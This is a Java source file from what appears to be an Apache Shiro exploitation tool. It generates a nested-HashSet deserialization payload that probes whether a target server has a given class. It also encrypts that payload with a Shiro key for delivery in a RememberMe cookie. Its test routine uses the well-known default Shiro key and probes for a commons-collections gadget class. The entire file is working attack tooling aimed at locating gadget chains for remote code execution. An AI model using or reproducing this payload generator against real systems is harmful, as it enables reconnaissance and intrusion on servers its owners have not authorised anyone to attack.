package com.y5neko.shiroexp.gadget;

import javassist.ClassPool;
import javassist.CtClass;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.Base64;
import java.util.HashSet;
import java.util.Set;

/**
 * FindClassByBomb - 通过嵌套 HashSet 探测目标是否存在指定类
 *
 * 原理：通过构造深层嵌套的 HashSet 结构，在反序列化时会触发深层次的类查找
 * 如果目标服务器存在指定类，反序列化会成功；否则会抛出 ClassNotFoundException
 *
 * Thanks to c0ny1
 */
public class FindClassByBomb {

    /**
     * 反射设置字段值
     */
    private static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    /**
     * 生成 payload
     * @param className 要探测的目标类名
     * @param depth 嵌套深度（默认 28）
     * @return 序列化数据
     * @throws Exception 异常
     */
    public static byte[] genPayload(String className, int depth) throws Exception {
        // 获取目标类的 Class 对象
        Class findClazz = getClass(className);

        // 构造嵌套 HashSet 结构
        Set<Object> root = new HashSet<Object>();
        Set<Object> s1 = root;
        Set<Object> s2 = new HashSet<Object>();

        for (int i = 0; i < depth; i++) {
            Set<Object> t1 = new HashSet<Object>();
            Set<Object> t2 = new HashSet<Object>();
            t1.add(findClazz);

            s1.add(t1);
            s1.add(t2);

            s2.add(t1);
            s2.add(t2);
            s1 = t1;
            s2 = t2;
        }

        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(root);
        oos.close();
        return baos.toByteArray();
    }

    /**
     * 生成 payload（使用默认深度 28）
     * @param className 要探测的目标类名
     * @return 序列化数据
     * @throws Exception 异常
     */
    public static byte[] genPayload(String className) throws Exception {
        return genPayload(className, 28);
    }

    /**
     * 获取目标类的 Class 对象
     * @param className 类名
     * @return Class对象
     */
    private static Class getClass(String className) throws Exception {
        try {
            // 尝试使用 Class.forName() 加载已存在的类
            return Class.forName(className);
        } catch (ClassNotFoundException e) {
            // 本地不存在该类，使用 Javassist 创建
            return createClass(className);
        }
    }

    /**
     * 使用 Javassist 创建类（带缓存机制，避免重复创建）
     */
    private static final java.util.Map<String, Class> classCache = new java.util.HashMap<>();

    private static Class createClass(String className) throws Exception {
        // 检查缓存
        if (classCache.containsKey(className)) {
            return classCache.get(className);
        }

        // 使用新的 ClassPool 实例，避免污染默认 ClassPool
        ClassPool pool = new ClassPool(true);
        pool.appendSystemPath();

        CtClass ctClass = pool.makeClass(className);
        Class clazz = ctClass.toClass();
        ctClass.defrost();

        // 缓存类对象
        classCache.put(className, clazz);

        return clazz;
    }

    /**
     * 生成加密后的 payload（用于直接发送）
     * @param className 类名
     * @param key Shiro Key
     * @param cryptType 加密类型（CBC 或 GCM）
     * @return Base64 编码的加密 payload
     * @throws Exception 异常
     */
    public static String genEncryptedPayload(String className, String key, String cryptType) throws Exception {
        byte[] payload = genPayload(className);
        String data = Base64.getEncoder().encodeToString(payload);
        return com.y5neko.shiroexp.misc.Tools.encryptByType(key, data, cryptType);
    }

    public static void main(String[] args) {
        try {
            // 测试生成 payload
            byte[] payload = genPayload("org.apache.commons.collections.map.LazyMap", 5);
            System.out.println("Payload length: " + payload.length);

            // 获取恶意类字节码
            String data = Base64.getEncoder().encodeToString(payload);
            String result = com.y5neko.shiroexp.misc.Tools.CBC_Encrypt("kPH+bIxk5D2deZiIxcaaaA==", data);
            System.out.println("Encrypted payload length: " + result.length());

        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
